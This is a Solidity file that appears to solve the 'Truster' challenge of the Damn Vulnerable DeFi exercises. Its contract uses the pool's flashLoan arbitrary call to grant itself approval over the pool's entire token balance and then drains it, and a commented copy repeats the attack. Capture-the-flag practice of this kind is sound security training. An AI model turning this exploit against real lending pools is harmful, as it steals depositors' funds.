// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./TrusterLenderPool.sol";
import "../DamnValuableToken.sol";

contract LenderPoolAttack {
    using Address for address;

    TrusterLenderPool public immutable lenderPool;

    DamnValuableToken public immutable token;

    constructor(TrusterLenderPool _lenderPool, DamnValuableToken _token) {
        lenderPool = _lenderPool;
        token = _token;
    }

    function attack(address player) external {
        uint256 poolBalance = token.balanceOf(address(lenderPool));
        bytes memory approvePayload = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
        lenderPool.flashLoan(0, player, address(token), approvePayload);
        token.transferFrom(address(lenderPool), player, poolBalance);
    }
}


// function attack(IERC20 token, ITrusterLenderPool pool, address attackerEOA)
//     public
// {
//     uint256 poolBalance = token.balanceOf(address(pool));
//     // IERC20::approve(address spender, uint256 amount)
//     // flashloan executes "target.call(data);", approve our contract to withdraw all liquidity
//     bytes memory approvePayload = abi.encodeWithSignature("approve(address,uint256)", address(this), poolBalance);
//     pool.flashLoan(0, attackerEOA, address(token), approvePayload);

//     // once approved, use transferFrom to withdraw all pool liquidity
//     token.transferFrom(address(pool), attackerEOA, poolBalance);
// }